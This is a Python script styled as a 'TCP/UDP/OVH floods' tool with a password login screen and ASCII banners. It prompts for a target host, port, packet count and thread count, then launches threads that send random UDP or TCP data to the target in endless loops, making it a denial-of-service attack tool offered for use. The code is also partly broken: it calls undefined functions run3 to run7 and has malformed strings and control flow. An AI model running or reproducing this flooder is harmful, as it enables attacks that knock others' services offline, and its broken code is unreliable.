#sourceloginbyxxbr
#sourcetoolsbyxinzz
#antirename²fclub
#antiabuseclub
import random
import socket
import threading
import os
import sys
import time

os.system("clear")
#login tools
password ="xxx.com"

print("""\u001b[35m                              
 __         ______     ______     __     __   __    
/\ \       /\  __ \   /\  ___\   /\ \   /\ "-.\ \   
\ \ \____  \ \ \/\ \  \ \ \__ \  \ \ \  \ \ \-.  \  
 \ \_____\  \ \_____\  \ \_____\  \ \_\  \ \_\\"\_\ 
  \/_____/   \/_____/   \/_____/   \/_/   \/_/ \/_/ 
""")
for i in range(3):
	pwd = input("\u001b[37m[+] Enter Password  : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("[!] Please Security To Password!!! ")
		break
	else:
		time.sleep(5)
		print("\u001b[31m[×] Wrong IS Security Password!!! ")
		continue
time.sleep(5)
print("\u001b[35m{√} Successfully Loginned")
time.sleep(2)

os.system("clear")
print("\033[95m 
  ██╗  ██╗██╗  ███╗      ██╗   ███████╗   ███████╗
╚██╗██╔╝██║████╗    ██║    ╚══███╔╝╚══███╔╝
   ╚███╔╝ ██║ ██╔██╗  ██║      ███╔╝         ███╔╝ 
   ██╔██╗ ██║ ██║╚██╗██║  ███╔╝         ███╔╝  
 ██╔╝ ██╗██   ██║  ╚████║   ███████╗███████╗
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚══════╝ \033[95m")


print("\033[95m TCP/UDP/OVH FLOODS \033[95m")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start() 
	if choice == 'OVH':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)